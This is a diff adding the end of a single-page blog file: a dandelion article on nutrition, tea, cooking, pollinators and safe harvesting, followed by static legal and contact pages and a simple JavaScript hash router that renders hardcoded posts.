+                   <p>Dandelions are often dismissed as stubborn weeds, but a closer look reveals something far more valuable. These bright yellow plants quietly thriving in yards and gardens are packed with nutrition, traditional uses, and natural benefits that have been appreciated for generations. From their roots to their flowers, dandelions offer a surprisingly versatile range of uses that can enhance your health, support your diet, and even contribute to a more sustainable lifestyle.</p>
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Dandelions are entirely edible, from roots to flowers</li>
+    <li>They are rich in vitamins, minerals, and antioxidants</li>
+    <li>Dandelion tea is commonly used for digestion and inflammation support</li>
+    <li>Young leaves make a nutritious addition to salads</li>
+    <li>They play an important role in supporting pollinators</li>
+    <li>Harvest only from chemical-free environments for safety</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Rediscovering the Value of Dandelions</h2>
+
+<p>Dandelions have been used in traditional remedies and culinary practices for centuries. What many people consider a nuisance in their lawn is actually a powerhouse of nutrients and natural compounds. Every part of the plant has a purpose, making it one of the most accessible and sustainable herbs available.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Dandelions are one of the few plants where the entire structure is usable. Leaves, roots, and flowers each offer unique benefits, making them incredibly efficient for both nutrition and natural wellness.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nutritional Benefits Hidden in Plain Sight</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Packed with Vitamins and Minerals</h3>
+
+<p>Dandelion greens are loaded with essential nutrients. They contain vitamins A, C, and K, along with minerals like calcium, potassium, and iron. These nutrients contribute to overall wellness, supporting everything from immune function to bone health.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Natural Antioxidants</h3>
+
+<p>The plant contains antioxidants that help combat oxidative stress. This can support the body’s natural defense systems and promote long-term health.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Dandelion Tea and Its Gentle Benefits</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Anti-Inflammatory Properties</h3>
+
+<p>Dandelion tea made from flowers and leaves is commonly enjoyed for its soothing qualities. Many people turn to it as a natural way to support the body’s response to inflammation.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Digestive Support</h3>
+
+<p>Drinking dandelion tea before meals is believed to stimulate digestion. It may help the body process food more efficiently and reduce discomfort after eating.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> For a mild and pleasant flavor, use young leaves and fresh flowers when preparing tea. Older leaves tend to be more bitter.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Roots: A Traditional Detox Ingredient</h2>
+
+<p>Dandelion roots have long been used in herbal practices. When cleaned, dried, and steeped, they create a tea that is often associated with gentle detox support. While the term detox can be overused, the root is traditionally linked to supporting liver function and digestion.</p>
+
+<div style="background:#f1f5f9;border:1px solid #e2e8f0;border-radius:12px;padding:16px 18px;margin:26px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Why This Matters</h4>
+  <p style="margin:0;">Natural, accessible plants like dandelions reduce reliance on processed alternatives and reconnect people with simple, effective wellness practices.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Using Dandelion Leaves in Everyday Meals</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Fresh Salad Ingredient</h3>
+
+<p>Young dandelion leaves are tender and slightly bitter, making them a great addition to salads. They pair well with citrus dressings and other fresh vegetables.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Cooking Options</h3>
+
+<p>Leaves can also be sautéed or added to soups. Cooking reduces bitterness and creates a flavor similar to spinach or kale.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Always harvest young leaves for the best taste and nutritional value. Mature leaves tend to be tougher and more bitter.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Supporting Pollinators Naturally</h2>
+
+<p>Dandelions are among the first flowers to bloom in many areas, making them an essential early food source for bees, butterflies, and other pollinators. Leaving some flowers in your yard can contribute to local biodiversity and ecosystem health.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Eco-Friendly Gardening</h3>
+
+<p>Instead of removing dandelions completely, consider allowing a small section of your yard to grow naturally. This supports wildlife while still maintaining a clean and organized space.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Safe Harvesting Practices</h2>
+
+<p>One of the most important aspects of using dandelions is ensuring they are free from chemicals. Avoid harvesting from areas treated with pesticides, herbicides, or near busy roads.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Where to Harvest</h3>
+
+<ul>
+  <li>Your own untreated yard</li>
+  <li>Organic gardens</li>
+  <li>Wild areas away from pollution</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> If you are unsure about the safety of a location, it is better to avoid harvesting altogether. Clean sourcing is essential when using plants for food or tea.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Using the Whole Plant for Maximum Benefit</h2>
+
+<p>Dandelions stand out because nothing goes to waste. The flowers can be used in teas or infused into syrups, the leaves in meals, and the roots for deeper herbal applications. This makes them an excellent example of a sustainable, zero-waste plant.</p>
+
+<p>Incorporating dandelions into your routine is simple. Start small by adding leaves to a salad or brewing a light tea. Over time, you can explore more uses and discover what works best for your lifestyle.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A New Perspective on a Familiar Plant</h2>
+
+<p>Dandelions are a perfect example of how nature often provides value in unexpected places. What is commonly removed or ignored can actually offer nutrition, wellness benefits, and environmental support. By understanding how to use dandelions safely and effectively, you can transform a simple backyard plant into a meaningful part of your daily routine.</p>
+
+<p>Embracing dandelions is not just about health. It is about reconnecting with natural resources, reducing waste, and appreciating the richness that already exists around you.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:16px 18px;margin:26px 0;">
+  <h4 style="font-size:20px;line-height:1.4;margin:0 0 10px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">At a Glance</h4>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Dandelions are fully edible and highly nutritious</li>
+    <li>They support digestion and overall wellness</li>
+    <li>They are beneficial for pollinators and ecosystems</li>
+    <li>Safe harvesting is essential for consumption</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Dandelion Benefits</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Herbal Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Dandelion Tea</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Edible Plants</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Organic Living</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Backyard Foraging</span>
+</div>
+
+                `
+
+            }
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "The Productivity & Life Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
